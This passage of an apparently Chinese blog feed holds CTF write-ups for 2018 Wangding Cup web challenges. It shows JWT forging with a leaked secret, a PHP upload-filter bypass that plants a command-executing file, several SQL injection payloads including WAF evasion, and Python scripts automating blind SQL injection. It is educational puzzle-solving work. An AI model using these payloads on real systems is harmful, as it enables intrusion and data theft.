class="line">$host = parse_url($uri,PHP_URL_HOST);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'$host = '</span>.$host.<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">if</span>($host === <span class="string">"c7f.zhuque.com"</span>)&#123;</span><br><span class="line">setcookie(<span class="string">"AuthFlag"</span>,<span class="string">"flag&#123;***&#125;"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>最后加上../是为了回到根目录，再加个/就等于回到localhost/</p><h3 id="gold"><a href="#gold" class="headerlink" title="gold"></a>gold</h3><p>题目：还在上小学的小明同学开发了一款游戏，你能通关吗？ </p><p><img src="/img/网鼎杯第三场Web/4.png" alt=""></p><p>抓包发现不断POST参数getGod，值从0开始叠加，图片显示收集1000金币就可以通关，就猜测可能POST参数getGod从0到1001就可以得到flag</p><p>利用burp的intruder模块发送参数getGod，值从0到1001</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/网鼎杯第三场Web/5.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/网鼎杯第三场Web/6.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/网鼎杯第三场Web/7.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>发现getGod=1001的响应包中显示了flag</p><p>PS：这关有防作弊机制，必须单线程的POST参数getGod从0到1001，否则就弹出防作弊的提示框</p><h3 id="i-am-admin"><a href="#i-am-admin" class="headerlink" title="i_am_admin"></a>i_am_admin</h3><p>题目：你能登录进去吗？ </p><p>一个登录界面，貌似要以admin身份才能获得flag</p><p>给出了提示We have prepare a test account for you to login; Username:Passwd = test:test  </p><p>以test身份登录</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/网鼎杯第三场Web/9.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>抓取登录数据包，发现登录时在cookie字段设置了auth字段</p><p>获得信息：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Welcome back test user, although i can&apos;t give u flag, but i will give u my SECRET:uy8qz-!kru%*2h7$q&amp;veq=y_r1abu-xd_219y%phex!@4hv62+</span><br></pre></td></tr></table></figure><p>查询得知是JWT，JWT具体介绍参考下面链接</p><p><a href="https://blog.csdn.net/qq_40081976/article/details/79046825" target="_blank" rel="noopener">https://blog.csdn.net/qq_40081976/article/details/79046825</a></p><p>到<a href="https://jwt.io/解码" target="_blank" rel="noopener">https://jwt.io/解码</a></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/网鼎杯第三场Web/8.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>登录test身份设置了auth字段，值就是JWT加密后的值，那么我们可以抓包在cookie添加auth字段，值为admin的JWT值，即eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIn0.NYSsNZ1gR8EUYebNTmXPBhdoh-mA5OjHkeWjM4gPxqY</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/网鼎杯第三场Web/10.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/网鼎杯第三场Web/11.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>获得flag</p><h3 id="phone"><a href="#phone" class="headerlink" title="phone"></a>phone</h3><p>题目：find the flag</p><p>有登录和注册的页面，试着注册账号test1,密码123,电话123</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/网鼎杯第三场Web/12.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>返回index.php页面</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/网鼎杯第三场Web/13.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>点击查询得到：有1人和你电话相似哦~ </p><p>猜测存在二次注入，根据我们注册用户的电话号码执行sql语句</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">count</span>(*) <span class="keyword">from</span> <span class="keyword">table</span> <span class="keyword">where</span> telephone=<span class="string">'123'</span>;</span><br></pre></td></tr></table></figure><p>我们再注册账号，密码123，电话123’#</p><p>这里电话号码必须是数字，我们可以将字符串转化为十六进制</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/网鼎杯第三场Web/14.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/网鼎杯第三场Web/15.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>在本地数据库测试一下</p><p>先创建表tel</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> tel</span><br><span class="line">(</span><br><span class="line">username <span class="built_in">varchar</span>(<span class="number">20</span>),</span><br><span class="line"><span class="keyword">password</span> <span class="built_in">varchar</span>(<span class="number">20</span>),</span><br><span class="line">telphone <span class="built_in">varchar</span>(<span class="number">100</span>)</span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>插入数据</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> tel <span class="keyword">values</span>(<span class="string">'test1'</span>,<span class="string">'123'</span>,<span class="string">'123'</span>);</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> tel <span class="keyword">values</span>(<span class="string">'test2'</span>,<span class="string">'123'</span>,<span class="string">"123#'"</span>);</span><br></pre></td></tr></table></figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/网鼎杯第三场Web/16.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>那么我们的注入点就在注册POST的phone参数，也就是电话号码</p><p>首先爆库，payload:123’ union select database() order by 1 desc#</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/网鼎杯第三场Web/17.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/网鼎杯第三场Web/18.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>库名为test</p><p>这里末尾加上order by 1 desc是为了将结果倒序</p><p>直接在数据库测试简单明了</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/网鼎杯第三场Web/19.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>如果不加order by，那么就只会显示查询的第一行结果1，如果我们将结果倒序处理</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/网鼎杯第三场Web/20.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>那么就显示了我们注入的结果</p><p>继续爆表，payload:123’ union select group_concat(table_name) from information_schema.tables where table_schema=database() order by 1 desc#</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/网鼎杯第三场Web/21.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/网鼎杯第三场Web/22.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>表名为flag,user</p><p>爆flag表下的列名，payload:123’ union select group_concat(column_name) from information_schema.columns where table_name=’flag’ order by 1 desc#</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/网鼎杯第三场Web/23.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/网鼎杯第三场Web/24.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>列名为f14g</p><p>爆f14g列下数据，payload:123’ union select group_concat(f14g) from flag order by 1 desc#</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/网鼎杯第三场Web/25.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/网鼎杯第三场Web/26.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>获得flag</p>]]></content>
    
    <summary type="html">
    
      ctf-Web
    
    </summary>
    
      <category term="ctf-Web" scheme="https://Foxgrin.github.io/categories/ctf-Web/"/>
    
    
      <category term="ctf" scheme="https://Foxgrin.github.io/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>网鼎杯第二场Web</title>
    <link href="https://Foxgrin.github.io//posts/47793/"/>
    <id>https://Foxgrin.github.io//posts/47793/</id>
    <published>2018-08-22T15:02:00.000Z</published>
    <updated>2018-09-04T13:24:19.920Z</updated>
    
    <content type="html"><![CDATA[<p>2018年网鼎杯第二场Web题解<a id="more"></a></p><h3 id="wafUpload"><a href="#wafUpload" class="headerlink" title="wafUpload"></a>wafUpload</h3><p>源代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$sandbox = &apos;/var/www/html/upload/&apos; . md5(&quot;phpIsBest&quot; . $_SERVER[&apos;REMOTE_ADDR&apos;]);</span><br><span class="line">@mkdir($sandbox);</span><br><span class="line">@chdir($sandbox);</span><br><span class="line"></span><br><span class="line">if (!empty($_FILES[&apos;file&apos;])) &#123;</span><br><span class="line">    #mime check</span><br><span class="line">    if (!in_array($_FILES[&apos;file&apos;][&apos;type&apos;], [&apos;image/jpeg&apos;, &apos;image/png&apos;, &apos;image/gif&apos;])) &#123;</span><br><span class="line">        die(&apos;This type is not allowed!&apos;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    #check filename</span><br><span class="line">    $file = empty($_POST[&apos;filename&apos;]) ? $_FILES[&apos;file&apos;][&apos;name&apos;] : $_POST[&apos;filename&apos;];</span><br><span class="line">    if (!is_array($file)) &#123;</span><br><span class="line">        $file = explode(&apos;.&apos;, strtolower($file));</span><br><span class="line">    &#125;</span><br><span class="line">    $ext = end($file);</span><br><span class="line">    if (!in_array($ext, [&apos;jpg&apos;, &apos;png&apos;, &apos;gif&apos;])) &#123;</span><br><span class="line">        die(&apos;This file is not allowed!&apos;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $filename = reset($file) . &apos;.&apos; . $file[count($file) - 1];</span><br><span class="line">    if (move_uploaded_file($_FILES[&apos;file&apos;][&apos;tmp_name&apos;], $sandbox . &apos;/&apos; . $filename)) &#123;</span><br><span class="line">        echo &apos;Success!&apos;;</span><br><span class="line">        echo &apos;filepath:&apos; . $sandbox . &apos;/&apos; . $filename;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        echo &apos;Failed!&apos;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">show_source(__file__);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>一道有过滤的文件上传题，首先过滤的是文件的类型，修改上传类型为[‘image/jpeg’, ‘image/png’, ‘image/gif’]数组中任一一个元素即可，接下来将数组$file的最后一个元素取出判断是否是[‘jpg’, ‘png’, ‘gif’]中的任一元素，如果不是则退出程序，最终上传的文件名为”数组$file的第一个元素.$file[count($file) - 1]”，我们知道如果是一个完整的数组，那么$file[count($file) - 1]一定是数组的最后一个元素，而上面又将最后一个元素规定为jpg或png或gif，而我们的目的是上传一个php文件，那么后缀名一定是要.php，那么我们就可以上传一个不完整的数组，例如</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $file = <span class="keyword">array</span>();</span><br><span class="line">$file[<span class="number">0</span>] = <span class="string">'demo.php'</span>;</span><br><span class="line">$file[<span class="number">10</span>] = <span class="string">'jpg'</span>;</span><br><span class="line"><span class="keyword">echo</span> $file[count($file) - <span class="number">1</span>]; <span class="comment">//NULL</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;br&gt;'</span>;</span><br><span class="line">$filename = reset($file) . <span class="string">'.'</span> . $file[count($file) - <span class="number">1</span>];</span><br><span class="line"><span class="keyword">echo</span> $filename; <span class="comment">//demo.php.</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这样就可以成功上传一个php文件，但是我们最终得到的文件名最后还有一个’.’，所以我们将$file[0]=demo.php/</p><p>这样最终得到demo.php/.</p><p>burp抓包修改</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/网鼎杯第二场Web/1.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>文件成功上传</p><p>访问url/upload/85ed06a27b8eb105c27cbc380822ede8/demo.php/.</p><p>抓包POST参数cmd任意执行命令</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/网鼎杯第二场Web/2.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>发现flag</p><p>读取</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/网鼎杯第二场Web/3.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><h3 id="unfinished"><a href="#unfinished" class="headerlink" title="unfinished"></a>unfinished</h3><p>首先来到的页面时login.php，没有其他提示，扫一下后台，发现register.php，</p><p>是一个注册页面，我们试着注册一个用户后登录，这里通过抓包发现注册成功后会返回302状态码重定向到login.php，否则返回200状态码回到register.php</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/网鼎杯第二场Web/4.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/网鼎杯第二场Web/5.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>我们可以发现，登录后又重定向到index.php，其中只有显示了用户名</p><p>有注册页面，有登录页面，很明显的存在sql查询，那么可以猜测注册页面的sql语句是</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> <span class="keyword">tables</span> <span class="keyword">values</span>(<span class="string">'$email'</span>,<span class="string">'$username'</span>,<span class="string">'$password'</span>)</span><br></pre></td></tr></table></figure><p>如果执行成功，则注册成功，重定向到login.php，然后执行sql语句</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> <span class="keyword">tables</span> <span class="keyword">values</span>(<span class="string">'$email'</span>,<span class="string">'$username'</span>,<span class="string">'$password'</span>)</span><br></pre></td></tr></table></figure><p>有查询结果则登录成功，返回查询结果的用户名信息</p><p>那么我们就可以推测这里存在二次注入，我们在register.php中的insert语句注入username，在index.php中显示注入的结果，这就是二次注入</p><p>接下来考虑insert注入</p><p>直接给出我的payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0&apos;+ascii(substr((select database()) from 1 for 1))+&apos;0</span><br></pre></td></tr></table></figure><p>这样sql语句就变成了</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> <span class="keyword">tables</span> <span class="keyword">values</span>(<span class="string">'$email'</span>,<span class="string">'0'</span>+<span class="keyword">ascii</span>(<span class="keyword">substr</span>((<span class="keyword">select</span> <span class="keyword">database</span>()) <span class="keyword">from</span> <span class="number">1</span> <span class="keyword">for</span> <span class="number">1</span>))+<span class="string">'0'</span>,<span class="string">'$password'</span>)</span><br></pre></td></tr></table></figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/网鼎杯第二场Web/6.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>本地数据库测试可行</p><p>那么接下来就是写脚本注入了</p><p>附上我的脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">register_url = <span class="string">"http://7144aea59c434409842c039e28cd3bc31fcff0f7dcb04f5b.game.ichunqiu.com/register.php"</span></span><br><span class="line">login_url = <span class="string">"http://7144aea59c434409842c039e28cd3bc31fcff0f7dcb04f5b.game.ichunqiu.com/login.php"</span></span><br><span class="line">database = <span class="string">""</span></span><br><span class="line">table_name = <span class="string">""</span></span><br><span class="line">column_name = <span class="string">""</span></span><br><span class="line">flag = <span class="string">""</span></span><br><span class="line"><span class="comment">#获取数据库名</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">10</span>):</span><br><span class="line">    register_data = &#123;</span><br><span class="line">        <span class="string">'email'</span>:<span class="string">'test@test'</span>+ str(i),</span><br><span class="line">        <span class="string">'username'</span>:<span class="string">"0'+ascii(substr((select database()) from %d for 1))+'0"</span>%i,</span><br><span class="line">        <span class="string">'password'</span>:<span class="number">123</span></span><br><span class="line">        &#125;</span><br><span class="line">    r = requests.post(url=register_url,data=register_data)</span><br><span class="line">    login_data = &#123;</span><br><span class="line">        <span class="string">'email'</span>:<span class="string">'test@test'</span>+ str(i),</span><br><span class="line">        <span class="string">'password'</span>:<span class="number">123</span></span><br><span class="line">        &#125;</span><br><span class="line">    r = requests.post(url=login_url,data=login_data)</span><br><span class="line">    match = re.search(<span class="string">r'&lt;span class="user-name"&gt;\s*(\d*)\s*&lt;/span&gt;'</span>,r.text)</span><br><span class="line">    asc = match.group(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">if</span> asc == <span class="string">'0'</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    database = database + chr(int(asc))</span><br><span class="line">print(<span class="string">'database:'</span>,database)</span><br><span class="line"><span class="comment">#获取表名</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">for i in range(1,20):</span></span><br><span class="line"><span class="string">    register_data = &#123;</span></span><br><span class="line"><span class="string">        'email':'test@test'+ str(i),</span></span><br><span class="line"><span class="string">        'username':"0'+ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()) from %d for 1))+'0"%i,</span></span><br><span class="line"><span class="string">        'password':123</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">    r = requests.post(url=register_url,data=register_data)</span></span><br><span class="line"><span class="string">    print(r.text)</span></span><br><span class="line"><span class="string">    login_data = &#123;</span></span><br><span class="line"><span class="string">        'email':'test@test'+ str(i),</span></span><br><span class="line"><span class="string">        'password':123</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">    r = requests.post(url=login_url,data=login_data)</span></span><br><span class="line"><span class="string">    r.encoding = r.apparent_encoding</span></span><br><span class="line"><span class="string">    print(r.text)</span></span><br><span class="line"><span class="string">    match = re.search(r'&lt;span class="user-name"&gt;\s*(\d*)\s*&lt;/span&gt;',r.text)</span></span><br><span class="line"><span class="string">    asc = match.group(1)</span></span><br><span class="line"><span class="string">    if asc == '0':</span></span><br><span class="line"><span class="string">        break</span></span><br><span class="line"><span class="string">    table_name = table_name + chr(int(asc))</span></span><br><span class="line"><span class="string">print('table_name:',table_name)</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="comment">#获取flag</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">    register_data = &#123;</span><br><span class="line">        <span class="string">'email'</span>:<span class="string">'test@test'</span>+ str(i) + str(i),</span><br><span class="line">        <span class="string">'username'</span>:<span class="string">"0'+ascii(substr((select * from flag) from %d for 1))+'0"</span>%i,</span><br><span class="line">        <span class="string">'password'</span>:<span class="number">123</span></span><br><span class="line">        &#125;</span><br><span class="line">    r = requests.post(url=register_url,data=register_data)</span><br><span class="line">    login_data = &#123;</span><br><span class="line">        <span class="string">'email'</span>:<span class="string">'test@test'</span>+ str(i) + str(i),</span><br><span class="line">        <span class="string">'password'</span>:<span class="number">123</span></span><br><span class="line">        &#125;</span><br><span class="line">    r = requests.post(url=login_url,data=login_data)</span><br><span class="line">    match = re.search(<span class="string">r'&lt;span class="user-name"&gt;\s*(\d*)\s*&lt;/span&gt;'</span>,r.text)</span><br><span class="line">    asc = match.group(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">if</span> asc == <span class="string">'0'</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    flag = flag + chr(int(asc))</span><br><span class="line">print(<span class="string">'flag:'</span>,flag)</span><br></pre></td></tr></table></figure><p>这里实际测试获取表名，发现information被过滤了，flag表只能猜测得到</p><p>最后执行结果</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/网鼎杯第二场Web/7.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><h3 id="sqlweb"><a href="#sqlweb" class="headerlink" title="sqlweb"></a>sqlweb</h3><p>题目首先给出了提示”admin拿不到flag”，题目是一个登陆页面，猜测存在sql注入</p><p>首先我们应该是要用admin来登录，先寻找注入点</p><p>抓包测试，服务器先检测输入的用户名是否存在，再检查密码是否正确</p><p>我们输入uname=admin&amp;passwd=1&amp;submit=login,提示password error</p><p>输入uname=admin’#&amp;passwd=1&amp;submit=login,提示password error</p><p>说明注入点可能在uname，被单引号包裹，那么我们可以根据提示password error 或者username error进行基于布尔的注入</p><p>输入uname=admin’ and 1=1#&amp;passwd=1&amp;submit=login,提示password error</p><p>提示waf:/sleep|benchmark|=|like|regexp|and||%|substr|union|\s+|group|floor|user|extractvalue|UpdateXml|ord|lpad|rpad|left|&gt;|,|ascii/i  !!! (trust me,no one can bypass it)</p><p>说明此处存在过滤关键字的waf，过滤了空格，用/**/替代，过滤了逗号，过滤了and，用&amp;&amp;替代，还过滤了等号，&gt;，不等号也没办法用，这里可以用in语句来进行布尔注入的判断</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/网鼎杯第二场Web/8.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>过滤了substr,还有mid可以用，过滤了逗号，那么可以用mid( from 1 for 1)</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/网鼎杯第二场Web/9.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>那么我们可以构造payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=admin&apos;/**/&amp;&amp;/**/mid((select/**/database())/**/from/**/1/**/for/**/1)/**/in(&apos;t&apos;)#&amp;passwd=1&amp;submit=login</span><br></pre></td></tr></table></figure><p>根据返回的username error或者password error判断，如果返回password error，说明判断语句正确，返回username error说明判断语句错误</p><p>这里发现响应头部字段存在提示</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hint: &lt;!--create table users ...id username passwd  --&gt;</span><br></pre></td></tr></table></figure><p>告诉了我们表的结构</p><p>猜测flag在passwd，那么我们就注出passwd列下的数据，payload如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=admin&apos;/**/&amp;&amp;/**/mid((select/**/passwd/**/from/**/users)/**/from/**/1/**/for/**/1)/**/in(&apos;t&apos;)#&amp;passwd=1&amp;submit=login</span><br></pre></td></tr></table></figure><p>但是发现这里还过滤了user，那么就去掉users</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=admin&apos;/**/&amp;&amp;/**/mid(passwd/**/from/**/1/**/for/**/1)/**/in(&apos;t&apos;)#&amp;passwd=1&amp;submit=login</span><br></pre></td></tr></table></figure><p>为什么可以这样呢，经过测试发现如果sql语句的前面已经指定了表和用户名，那么passwd直接返回的是该表下用户名对应的密码，如下图所示</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/网鼎杯第二场Web/10.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>接下来就是写个脚本注入了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://8d1802ff177a4d569dafef8aac590cbde77f688da3624512.game.ichunqiu.com/sql.php"</span></span><br><span class="line">all_string = <span class="string">"&#123;&#125;-1234567890qwertyuiopasdfghjklzxcvbnm"</span></span><br><span class="line">passwd = <span class="string">""</span></span><br><span class="line">f = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> all_string:</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">'uname'</span>:<span class="string">"admin'/**/&amp;&amp;/**/mid(passwd/**/from/**/%d/**/for/**/1)/**/in('%s')#"</span>%(i,j),</span><br><span class="line">            <span class="string">'passwd'</span>:<span class="string">'1'</span>,</span><br><span class="line">            <span class="string">'submit'</span>:<span class="string">'login'</span></span><br><span class="line">            &#125;</span><br><span class="line">        r = requests.post(url,data=data)</span><br><span class="line">        <span class="keyword">if</span> len(r.text) == <span class="number">75</span>:</span><br><span class="line">            passwd = passwd + j</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">elif</span> len(r.text) == <span class="number">77</span> <span class="keyword">and</span> j == <span class="string">'m'</span>:</span><br><span class="line">            f = <span class="number">1</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> f == <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">print(<span class="string">'passwd:'</span>,passwd)</span><br></pre></td></tr></table></figure><p>运行结果passwd: 